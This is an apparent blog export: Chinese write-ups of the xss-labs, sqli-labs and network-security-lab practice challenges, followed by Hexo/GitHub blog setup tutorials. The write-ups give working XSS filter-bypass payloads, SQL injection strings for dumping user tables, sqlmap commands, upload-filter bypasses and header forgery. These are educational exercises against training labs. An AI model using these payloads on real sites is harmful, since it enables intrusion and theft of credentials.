strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);……&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;……if(false===strpos($str7,&apos;http://&apos;))&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; &#125;else&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;&#125; 有两处输出，一处input做了转义处理，另一处做了小写处理和script,on,src,data,href，” ，被做了替换处理，而且出现了strpos()函数，表示查找 “http://“ 在字符串中第一次出现的位置。只要!=false，就会跳向可攻击的语句，所以构造的语句中要含有http://，利用javascript中的注释符//，payload:javascrip&amp;#116:alert(1)//http:// less-10查看源代码，123456789$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt; 有两处输出，一处被做了转义，一处input被作为隐藏表单(type=”hidden”)处理页面没有显示，需要先将隐藏表单触发显示出来，然后在input处攻击，看到url处可以get参数t_sort，所以可以构造payload了。payload:url后加 &amp;t_sort=xss&quot; onclick=alert(1) type=&quot;text&quot; xss(1~10)关卡全部完成了，如有错误，欢迎在评论中指出!","categories":[],"tags":[]},{"title":"sqli-labs(1~22)","slug":"sqli-labs(1_22)","date":"2019-03-06T16:00:00.000Z","updated":"2020-09-20T08:41:17.722Z","comments":true,"path":"2019/03/07/sqli-labs(1_22)/","link":"","permalink":"https://wxt406611016.github.io/2019/03/07/sqli-labs(1_22)/","excerpt":"","text":"sqli-labs网址链接 less-1方法一：输入?id=1正常显示，输入?id=1’报错，输入?id=1’ and 1=’1，正常显示，得知是字符型注入，爆字段： ?id=1&#39; order by 3--+查看回显内容：?id=-1‘ union select 1,2,3--+爆库名，版本号：？id=-1&#39; union select 1,database(),version()爆所有数据库：?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23爆表名：?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;%23爆列名：?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23爆数据：?id=-1&#39; union select 1,2,group_concat(id,username,password) from users%23 方法二：借助sqlmap软件直接爆破最终payload：./sqlmap.py -u &quot;http://43.247.91.228:84/Less-1/?id=1&quot; -D security -T users --dump得到的数据结果如下： 获取数据 less-2输入1’，根据报错信息确定输入的内容被原封不动的带入到数据库中，输入?id=1 and 1=1,显示正常，得知是数字型注入，将单引号去掉，其他方法步骤和less-1一样，不再重复了。直接上爆数据payload：?id=-1 union select 1,2,group_concat(id,username,password) from users%23sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-3单引号报错，输入1’，根据报错信息发现输入的内容后有’)，想到应该以 ‘) 来闭合表达式，脑补一下输入1后的sql语言，形如select … from … where id=(‘1’) …，在第一题中id=1的后面加上’）,其他步骤和方法和less-1一样，不再重复了。直接上爆数据payload：?id=-1&#39;) union select 1,2,group_concat(id,username,password) from users%23sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-4双引号报错，输入1’，显示正常，输入1’’,根据报错信息发现输入的内容后有”)，想到应该以 ‘’) 来闭合表达式，脑补一下输入1后的sql语言，形如select … from … where id=(‘’1’’) …，在第一题中id=1的后面加上’’）,其他步骤和方法和less-1一样，不再重复了。直接上爆数据payload：?id=-1&quot;) union select 1,2,group_concat(id,username,password) from users%23sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-5输入之前的内容发现不再显示数据信息，应该是报错注入或者盲注。输入?id=1’报错，根据sql语法错误提示，得知是字符型报错注入。爆库名：?id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23爆表名：?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)%23爆列名：?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e),1)%23爆数据：?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)%23sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-6与第5关类似，只不过这一关使用的是” “的方式闭合字符串，我们只需要将?id=1’ 改为 ?id=1”,后面的参数不变，其余过程不再赘述，和less-5一样。sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-7输入?id=1&#39;报错，经几次测试后发现只有在后面添加 ‘ 会报错，但是这次后台对报错进行了处理，所有错误都显示语法错误。我们利用单引号进行进一步注入：?id=1&#39; and sleep(3)--+还是报错，猜测是不是过滤了某些字符，测试过滤字符：?id=1&#39; and sleep(3) or 1=&#39;1发现显示正常了，发现后台过滤了的注释字符,通过盲注一步步判断判断数据库的第一个字符是s：?id=1&#39; and ascii(substr((select database()),1,1))=115 and 1=&#39;1显示正常，说明数据库的第一个字符的acsll值为115，即为s。一步步尝试，过程比较麻烦，使用脚本比较方便。可直接sqlmap跑一下，payload后的参数和less-1一样。 less-8这一个和less-7差不多，把报错全部过滤了，如果错误就没有返回，正确就返回you are in……，而其注释符没有被过滤，我们就可以利用基于布尔的盲注进行测试：判断数据库的第一个字符是s：?id=1&#39; and ascii(substr((select database()),1,1))=115--+一步步尝试，过程比较麻烦，使用脚本比较方便。可直接sqlmap跑一下，payload后的参数和less-1一样。 less-9无论输入什么都是返回相同的内容，报错注入无效了，尝试一下时间盲注：判断是否有注入：?id=1&#39; and sleep(3)--+，停留了3s后刷新，说明存在注入点。其他的和less-7差不多，只是在最后要加上and sleep(3)--+来判断对错。判断数据库的第一个字符是s：?id=1&#39; and ascii(substr((select database()),1,1))=115 and sleep(3)--+一步步尝试，过程比较麻烦，使用脚本比较方便。可直接sqlmap跑一下，payload后的参数和less-1一样。 less-10和less-9类似，只是闭合符号变成了 ‘’ ，检查是否存在注入：?id=1&#39;&#39; and sleep(3)--+,停留了3s后刷新，说明存在注入点。其他的和less-9一样了，判断数据库的第一个字符是s：?id=1&#39;&#39; and ascii(substr((select database()),1,1))=115 and sleep(3)--+一步步尝试，过程比较麻烦，使用脚本比较方便。可直接sqlmap跑一下，payload后的参数和less-1一样。 less-11方法一：页面显示变了，不再是get方式传递参数，改为post方式传参，通过尝试发现闭合方式为 ‘ ,先使用万能钥匙登陆，登陆成功。 万能密码登陆 查看是否有注入点，爆字段试试， 爆字段 开始尝试order by 3#提示错误，最终确定order by 2#正常，接着判断回显内容，并爆数据库， 爆数据库 爆表名， 爆表名 爆列名， 爆列名 爆数据， 爆数据 方法二：还可以借助sqlmap软件直接爆破最终payload：./sqlmap.py -u &quot;http://localhost/sqli-labs/Less-11/&quot; --data=&quot;uname=*&amp;passwd=*&quot; -D security -T users --dump less-12根据题目提示闭合方式应该为 “) ，输入万能钥匙，果然登陆成功， 万能钥匙登陆 其他的和less-11一样，只是闭合方式变成了”)，其他的就不赘述了。下面直接上爆数据的截图， 爆数据 也可直接sqlmap跑一下，payload后的参数和less-11一样。 less-13根据提示闭合方式应该是 ‘) ，但是利用万能钥匙成功登陆后并不显示有用信息，尝试报错注入，竟然成功了。 爆数据库 接着爆表名： 爆表名 接着爆列名： 爆表名 最后爆数据： 爆数据 也可直接sqlmap跑一下，payload后的参数和less-11一样。 less-14通过尝试发现闭合方式为 “ ，其他方法和less-13一样，不再赘述，下面直接上爆数据的截图， 爆数据 也可直接sqlmap跑一下，payload后的参数和less-11一样。 less-15根据提示闭合方式为 ‘ ，但无论输入什么，都不再输出任何信息，只能尝试盲注，判断库名的第一个字符是否为s: 判断库名的第一个字符是s 返回登陆成功，说明库名的第一个字符为s，反之则返回登陆失败。接着要一步步尝试，过程比较麻烦，使用脚本比较方便。 less-16通过尝试发现闭合方式为 “)，其他和less-15一样，只不过改变了闭合方式，直接上判断库名第一个字符是否为s的截图 判断库名的第一个字符为s 返回登陆成功，说明说明库名的第一个字符为s，反之则返回登陆失败。接着要一步步尝试，过程比较麻烦，使用脚本比较方便。 less-17利用万能钥匙登陆，竟然被嘲讽了。发现页面显示重置密码，sql语句应该类似于update table set password=&#39;xxx&#39; where username = &#39;xxx&#39;,需要我们先知道一个username，前几关爆数据的时候username里都有Dumb,我们输入username为Dumb，密码为123456后提示密码更改成功，然后进一步尝试，利用用户名为Dumb在密码处进行注入，在密码栏里写入：1&#39; order by 3# ，报错了。试一下报错注入，在密码栏里输入：1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#，成果爆出库名，爆表名：密码栏输入-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)#,爆列名：-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;),0x7e),1)#。 sqlmap也可以跑出来数据库和表，参数的payload：--data=&quot;uname=admin&amp;passwd=*&quot; -D security -T tables --dump。 less-18根据提示应该是UA注入，查看源代码，发现输入内容都有审查函数，不存在注入，先试一下UA注入。根据前几关知道有一组数据为admin-admin，所以在username和password处都输入admin，成功登陆，看到提示信息，然后bp抓包后把User-Agent后的内容改为 1’ 运行，报错，说明存在注入，而且源代码里发现很重要的一条语句 INSERT INTO table_name (‘uagent’,’ip_address’,’username’) VALUES (‘\\$uagent’,’\\$IP’,’$uname’)，需要构造注入语句，还要满足闭合条件,爆库名：&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1 修改User-Agent 成功得到库名，其他步骤都类似了，不再赘述。 less-19与less-18类似，根据提示是Referer注入，成功登陆后bp抓包，修改Referer内容。爆库名：&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1 修改Referer 成功得到库名，其他步骤都类似了，不再赘述。 less-20与less-19类似，根据提示是Cookie注入，成功登陆后bp抓包，修改Cookie内容。爆库名：uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1 修改Cookie 成功得到库名，其他步骤都类似了，不再赘述。 less-21按less-20的方法成功登陆后，发现页面和less-20有一些不同， base64编码 uname后的数据加密了，看到加密末尾的 = ，猜测应该是base64编码，到网上将admin进行base64加密，加密结果果然一样。需要把注入字段进行base64加密，其他方法和less-20一样。爆库注入字段：uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1注入字段base64编码：uname=JyBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9JzE=成功登陆后修改Cookie内容， 修改Cookie，并进行base64编码 成功得到库名，其他步骤都类似了，不再赘述。 less-22和less-21类似，根据题目提示闭合方式是 “ ，其他方法和less-21一样。爆库注入字段：uname=&quot; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&quot;1注入字段base64编码：uname=IiBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9IjE=成功登陆后修改Cookie内容， 修改Cookie并进行base64编码 成功得到库名，其他步骤都类似了，不再赘述。 sqli-labs(1~22)关卡全部完成了，如有错误，欢迎在评论中指出!","categories":[],"tags":[]},{"title":"网络安全实验室--上传关","slug":"网络安全实验室--上传关","date":"2019-02-19T16:00:00.000Z","updated":"2020-09-20T08:41:58.834Z","comments":true,"path":"2019/02/20/网络安全实验室--上传关/","link":"","permalink":"https://wxt406611016.github.io/2019/02/20/网络安全实验室--上传关/","excerpt":"","text":"基础关题目地址网络安全实验室之上传关，题目略少，也很基础，如有错误，欢迎在评论中指出。 1.请上传一张jpg格式的图片只能上传jpg格式的图片哦～！（过关地址）解：上传一张jpg图片，被嘲讽了没有得到flag，想到实际应上传php文件，应该想到上传jpg文件然后修改请求报文里的相关内容，先bp抓包，发送到repeater，修改filename后的后缀名，将jpg改为php，点击go，得到flag。ps:还有一种方法，通过查看页面源代码，发现是前端JS控制的，直接利用NoScript插件禁用JS功能，然后上传php文件，得到flag。 修改filename后缀 key is IKHJL9786#$%^&amp; 2.请上传一张jpg格式的图片只能是jpg哦！（过关地址）解：上传一张jpg文件，提示信息和上道题类似，解决方法也相同，先上传一张jpg文件然后bp抓包发送到repeater，修改filename里的后缀，将jpg改为php，得到flag。key is 76tyuhjsdvytig#$%^&amp; 3.请上传一张jpg格式的图片只能是jpg哦！（过关地址）解：上传一张jpg文件，依然是相似提示，但是按照前两题的解题做法依然得不到flag，查看页面源代码，发现要求文件名第一个”.”后面为jpg就可以，试一下更改filename的后缀名，将jpg改称jpg.php，得到flag。 页面源代码 修改filename后缀 key is jkljdkl232jkljkdl2389 欢迎一起讨论！","categories":[],"tags":[]},{"title":"网络安全实验室--基础关","slug":"网络安全实验室--基础关","date":"2019-02-13T16:00:00.000Z","updated":"2020-09-20T08:42:14.398Z","comments":true,"path":"2019/02/14/网络安全实验室--基础关/","link":"","permalink":"https://wxt406611016.github.io/2019/02/14/网络安全实验室--基础关/","excerpt":"","text":"基础关题目地址刚入web坑，菜鸟一枚，如有错误，欢迎在评论中指出。 1.key在哪里？（过关地址）解：右击查看网页源代码，得到flag。key is jflsjklejflkdsjfklds 2.再加密一次你就得到key啦~加密之后的数据为xrlvf23xfqwsxsqf解：根据提示再加密一次得到key，这是rot13加密的特点，我们再用rot13加密一次，得到flag。keyis23ksdjfkfds 3.猜猜这是经过了多少次加密？加密后的字符串为：Vm0wd2QyUXlVWGxWV0d4V1YwZDRWAxV2JETlhh……（中间省略n行）UVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0=解：根据加密结果的最后是“=”，这是base64加密的标志，我们通过base64不断解密20次，得到flag。key is jkljdkl232jkljkdl2389 4.据说MD5加密很安全，真的是么？密文：e0960851294d7b2253978ba858e24633解：直接将密文通过md5在线解密，得到flag。bighp 5.种族歧视小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！过关地址解：访问页面显示only for Foreigner，bp抓包看看，把抓到的包发送到repeater，根据提示把accept-language后的中文支持删掉，果然得到flag。 修改accept-language，得到flag key is: (TU687jksf6&amp;** 6.HAHA浏览器据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？过关地址解：访问网页提示要安装HAHA浏览器，想到修改user-agent，bp抓包，将包发送到repeater，将user-agent后的浏览器名称改为HAHA，得到flag。 修改user-agent key is: meiyouHAHAliulanqi 7.key究竟在哪里呢？上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？过关地址解：访问页面没有得到想要的信息，bp抓包，在response栏里得到flag。 发现key Key: kjh%#$#%FDjjj 8.key又找不到了小明这次可真找不到key去哪里了，你能帮他找到key吗？过关地址解：访问页面无有用信息，bp抓包，在一个页面的response栏里发现有用信息。 发现绿色的提示信息 根据提示访问./key_is_here_now_.php页面，得到flag。key: ohHTTP302dd 9.冒充登陆用户小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？过关地址解：根据提示应想到修改与登陆有关的值，bp抓包，发送到repeater，将Cookie的Login设为1得到key。 修改Cookie的Login值 key is: yescookieedit7823789KJ 10.比较数字大小只要比服务器上的数字大就可以了！过关地址解：访问页面，尝试输入，发现只能输入3位数，打开web控制台，点击HackBar插件（需要先在FireFox浏览器上下载该插件），先点击Load URL，再勾选Post data，然后修改v=10000，点击Execute，得到flag。 post传参 key is 768HKyu678567&amp;\\&amp;K* 11.本地的诱惑小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？过关地址解：根据提示应想到修改ip地址为本地，想到X-Forwarded-For，bp抓包，发送到repeater，添加X-Forwarded-For：127.0.0.1，得到flag。 添加X-Forwarded-For key is ^&amp;(UIHKJjkadshf* 12.就不让你访问小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!过关地址解：访问页面，提示key在admin页面，访问admin.php，是个错误页面，bp抓包，没抓到有用信息，试一下后台扫描（我用的是工具是御剑后台扫面），发现robots.txt。 后台扫描 打开发现有用信息（Disallow: /9fb97531fe95594603aff7e794ab2f5f/），Disallow为不让搜索引擎收录，所以扫描工具没有扫描到，但用户可以访问，打开http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/，提示在login page，访问./login.php，得到flag。key is UIJ%%IOOqweqwsdf 欢迎一起讨论！","categories":[],"tags":[]},{"title":"github+hexo更换主题:indigo","slug":"github+hexo更换主题","date":"2019-02-07T16:00:00.000Z","updated":"2020-09-20T08:42:39.094Z","comments":true,"path":"2019/02/08/github+hexo更换主题/","link":"","permalink":"https://wxt406611016.github.io/2019/02/08/github+hexo更换主题/","excerpt":"","text":"github+hexo更换主题:上一篇写了关于github+hexo搭建个人博客的过程,搭建成功后页面主题是默认主题,但其实有很多主题可供选择,这篇文章就主要学习一下如何更换主题,以及更换主题后如何丰富优化功能,如评论功能,站内搜索功能. 1.查看并选择主题主题当然不用自己开发,这涉及到很多前端知识很复杂,而在hexo官网上,就有themes栏,有已经开发完成的主题可供选择.(点击选择主题to themes)! hexo主题页面 可以看到有很多主题可以选择,点击图片可以进入预览模式,选择完成后,返回主题页面,点击主题名(如上图中,点击”一个男孩”字样),即可进入开发者的github页面.本例中,我们以indigo为例,页面如下图所示,也可点击图片下方”进入indigo预览”进入预览模式. indigo页面 (进入indigo预览) 然后我们进入对应开发者的github页面.(进入开发者github) 2.从github clone indigo主题进入开发者github页面后,点击”clone or download”,选择use ssh,会出现git命令,复制该命令到终端并运行. 1git clone git@github.com:yscoder/hexo-theme-indigo.git (速度可能较慢,还记得上篇提到的翻墙git吗,速度快很多)将clone下来的文件夹放入hexo下themes文件夹下.clone后,需要安装主题需要的依赖.1234npm install hexo-renderer-less --save #安装less,作为css的预处理工具 npm install hexo-generator-feed --save #安装rss的feed生成工具 npm install hexo-generator-json-content --save #用于生成静态站点数据，用于站内搜索的数据源 npm install hexo-helper-qrcode --save #用于生成微信分享二维码 3.修改_config.yml,使用indigo主题打开_config.yml,将主题更改,如以下代码:1234# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: hexo-theme-indigo 4.调整修改个人信息 _config.yml的author改成自己,title改为自己想展示的内容， themes/indigo/_config.yml里的email改成自己的邮箱,title_change改成自己想展示的,头像avater可以自行调整图片路径,menu可以自行修改调整.下面是我个人调整的代码,根据需要调整修改. 123456789101112131415161718192021menu: home: url: / archives: url: /archives tags: text: CUMT url: http://cs.cumt.edu.cn/ target: _blank github: url: https://github.com/xxxxx target: _blank weibo: url: https://weibo.com/xxxxx target: _blank# 你的头像urlavatar: /img/host.jpg# 动态定义titletitle_change: normal: Welcome My Blog leave: Welcome 5.增加评论功能:valine有很多评论系统,本例中我们选择valine,这个评论系统是基于LeanCloud的，大家应该对这个很熟悉，官网网址如下，LeanCloud官网,需要注册一个账户。注册完成后登录,依次点击设置-&gt;应用Key,得到App ID和App Key,打开themes/indigo/_config.yml,因为该主题集成了valine方法,所以直接修改valine对应的参数就可以了: 12345678910valine: enable: true # 如果你想使用valine，请将值设置为 true appId: xxxxxxxxxxxxxxxxxxxxxxx #在应用Key里得到的App ID appKey: xxxxxxxxxxxxxxxxxxxxxx #在应用Key里得到的App Key notify: false # Mail notify verify: false # Verify code avatar: mm # Gravatar style : mm/identicon/monsterid/wavatar/retro/hide placeholder: 说点什么吧!(别忘了先填写上面的昵称哦) # Comment Box placeholder guest_info: nick # Comment header info pageSize: 10 # comment list page size 登录你的LeanCloud页面,依次点击设置-&gt;安全中心,在Web安全域名下添加你的github博客网址,如下图 本图中github账户名为wxt406611016 6.将本地文件重新上传到github最后将本地文件编译后上传到github上,在终端输入以下代码.123hexo clean #清除缓存文件hexo g #生成静态文件hexo d #上传部署网站 ok,主题更换完成,评论功能也添加,继续打造属于你自己的博客吧!","categories":[],"tags":[]},{"title":"ubuntu下 github+hexo个人博客搭建","slug":"github+hexo个人博客搭建","date":"2019-02-06T16:00:00.000Z","updated":"2020-09-20T08:43:14.886Z","comments":true,"path":"2019/02/07/github+hexo个人博客搭建/","link":"","permalink":"https://wxt406611016.github.io/2019/02/07/github+hexo个人博客搭建/","excerpt":"","text":"github+hexo搭建详细过程:我的操作系统为ubuntu16.04,在搭建的过程中参考了网上很多例子,但都没有完全适合自己的,多多少少还是会碰到一些问题,下面将详细展现github+hexo的搭建过程.tips:萌新一枚,有不足之处,还请指出,tks!!! 在搭建个人博客之前需要先安装一些环境: 1.安装nvmnvm是node的包版本控制工具,nvm的好处在于你可以找到各种你想要的node版本,这里我们选择安装稳定版的node.(如果选择终端命令apt-get install nodejs方法安装node,node的版本较低,在后续的搭建过程中可能会报错),所以这里建议先安装nvm. 代码安装nvm(git过程中可能速度缓慢,如果你会翻墙可以翻墙git,个人亲测,速度提升明显)1git clone https://github.com/creationix/nvm.git ~/.nvm &amp;&amp; cd ~/.nvm &amp;&amp; git checkout `git describe --abbrev=0 --tags` 接下来我们编辑环境变量配置文件 12cd vim .bashrc 将source ~/.nvm/nvm.sh.添加到.bashrc中,然后保存退出输入命令source .bashrc 将新增的nvm添加到系统中.输入命令nvm --version 如果显示版本,则显示安装成功. 2.安装node安装完nvm接下来使用nvm安装node和npm,首先检查远程仓库的可选版本1nvm ls-remote 安装node的稳定版 1nvm install stable 启用安装好的版本,并设置为默认版本 12nvm use nodenvm alias default node 3.安装hexo如果nvm安装完成且成功配置好稳定版以后，就可以安装hexo了. 12345mkdir blog #创建一个文件夹,文件夹名自拟,本例中为bloghexo init blog cd blog npm install npm update -g 执行没有报错的话hexo应该就可以用了,在blog目录下输入以下命令. 12hexo g # 生成静态界面hexo s # 开启本地服务 如果命令行结果如下则安装成功了,此时你可以crtl+鼠标点击命令行url进入该页面。 测试安装成功 4.配置本机全局git环境假设我的邮箱是tom@gmail.com,github的名字是tom 12git config --global user.email “tom@gmail.com” git config --global user.name “tom” 5.生成ssh密钥命令端输入,生成ssh密钥 1ssh-keygen -t rsa -C tom@gmail.com 会提示让你输入文件夹的名字来存放ssh秘钥，并且让你确认一个验证的密码，按要求操作就好了。然后输入下面命令查看ssh密钥文件中的公钥内容. 1less ~/.ssh/id_rsa.pub 6.创建博客工程建一个新的仓库，假设你的用户名是tom，那么你生成的这个工程命名必须为tom@github.io。(下图中是我个人的github用户名,为wxt406611016) 本例中用户名为wxt406611016 其他的按照默认配置就可以,然后点击Create repository创建. 然后将你的ssh密钥添加到你的github中在你的github页面依次点击Settings-&gt;SSH and GPG keys-&gt;New SSH key,将第五步中的公钥内容复制到Key里,点击Add SSH key.(如下图) 添加页面 7.在hexo中配置git在blog文件夹下的 config.yml文件中配置你的git,添加以下代码.注意代码中的xxx为你的github的用户名 1234deploy: type: git repository: ssh://git@github.com/xxx/xxx.github.io.git branch: master 8.将本地文件上传到github先安装hexo deploy插件,输入以下代码. 1npm install hexo-deployer-git --save 最后将本地文件编译后上传到github上,在终端输入以下代码.12hexo g #生成静态文件hexo d #上传部署网站 大功告成了,github+hexo搭建的个人博客就完成了,快在浏览器中输入xxx.github.io(xxx为你github的账户名)来看看你的博客吧 关于如何更改主题,查看下一片文章点击–github+hexo更换主题","categories":[],"tags":[]}]}